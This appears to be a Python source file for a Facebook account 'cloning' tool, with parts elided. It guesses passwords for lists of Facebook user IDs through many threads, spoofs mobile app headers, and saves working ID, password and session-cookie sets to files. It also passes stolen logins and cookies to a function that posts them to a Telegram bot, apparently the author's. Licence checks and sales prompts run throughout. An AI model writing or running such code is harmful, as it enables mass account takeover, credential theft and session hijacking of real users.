# Welcome To (Tools By Abdur-Rahman)
# Time Succes : 2023-04-09 06:48:38.657478
import os
...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO A🔹R WORLD          ')
...
def Elite(id,ps,coki):
    try:
        ...
        url = f"@arfacebook270/bot{token}/sendMessage"
...
from concurrent.futures import ThreadPoolExecutor as SiamAR
from string import * 
...
totaldmp = 0
filter = []
os.system("xdg-open https://t.me/freepaidcouse24")
sys.stdout.write('\x1b]2; Mr:AR\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo=(f"""\033[1;93m
      ...
      \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m CREATED BY\33[0;m   :\033[1;96m  MD.ABDUR RAHMAN 
      \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m FACEBOK      :\033[33;1m  Md.Abdur Rahman 󱢏 
      \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m GITHUB       : \033[37;1m ABDUR_RAHMAN-127      
      \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL STATUS  :\033[1;36m  FILE/RANDOM  
      \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM         : \033[37;1m COMING SOON                  
      \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL VIRSION : \033[1;36m 1.0                   
      \033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌┈⊰᯽⊱\033[1;31m[\033[1;32m+\033[1;32m]
                        SUPPORT THIS BRO 👈
""")
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back AR Menu ")
        exit()
...
def menu():   
  ...
  ###  elif select =='2':
       ...
       os.system('xdg-open https://t.me/+8801778869540');menu()
    else:
        print('\n Select Wrong option ... ')
        time.sleep(2)
        AR(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mAR-XD-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ARb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ARb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mAR-🖤\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    
                    Elite(sid,ps,ckkk)
                    oks.append(sid)                 
                    open('/sdcard/AR/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/AR/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\x1b[1;96m [AR-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/AR/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mAR-XD-M3\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/AR/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AR/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                   # print(f"\r\x1b[1;96m [AR-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/AR/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mAR-XD-M2\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard//AR/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/AR/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\x1b[1;96m [AR-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/AR/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodD(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mAR-XD-M4\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/AR/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/AR/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                  #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard//AR/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def pasw(self):       
            ...
            print(f'\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            print("\x1b[38;5;46mUSE AEROPLANE MOOD IN EVERY 5 MIN ")
            from datetime import datetime
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            print("\x1b[38;5;46mCloneing Start Time \x1b[1;92m●\x1b[38;5;46m ", current_time)
            print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with SiamAR(max_workers=30) as ARworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ARworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                ARworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                ARworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                ARworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)
...
def AFG_CLONING():
    ...
    with ThreadPool(max_workers=70) as Aryan:
        ...
        print('\x1b[1;92m THE PROCESS IS RUNNING')
        linex()
        for guru in user:
            uid = kode+guru
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[AR-OK] '+cid+' | '+ps+'\033[0;97m')
                print('\n[‎‎🤍]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                linex()
                open('AR-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[AR-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('AR-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;92m[AR]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass 
############            
...
def main_apv():
    ...
    print(logo)
    uuid = str(os.geteuid())
    Xyteee=('A🔹R1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    os.system("clear");print(logo)
    print(f" Your Key : \033[1;96m"+Xyteee)
    print("\033[37;1m--------------------------------------------------")
    try:
        system = requests.get("https://github.com/AbdurRahman-127/NIX-FIRE/blob/main/NIX-FIRE.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            ...
            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : AR Tools Can buy in all countries!')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            print('\033[1;92m [\033[1;92m1\033[1;92m]\033[1;92m TrialFree \033[1;92m1 month')
            print(' \033[1;92m[\033[1;92m2\033[1;92m]\033[1;92m TrialFree \033[1;92m15 days')
            print(' \033[1;92m[\033[1;92m3\033[1;92m]\033[1;92m TrialFree \033[1;92m7 days \033[1;37m')
            print('\033[1;92m-----------------------------------------------------')
            ...
            print("-----------------------------------------------------")
            url_wa = "https://api.whatsapp.com/send?phone=+8801778869540&text="
            choice = input(" Enter your choice  : ")
            tks = ("Hi Abdur Rahman Sir, I Need To Buy Your A🔹R Tools Version 1.0 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
...
with SiamAR(max_workers=30) as rhu:
 #   rhu.submit(sexy)
    rhu.submit(main_apv)
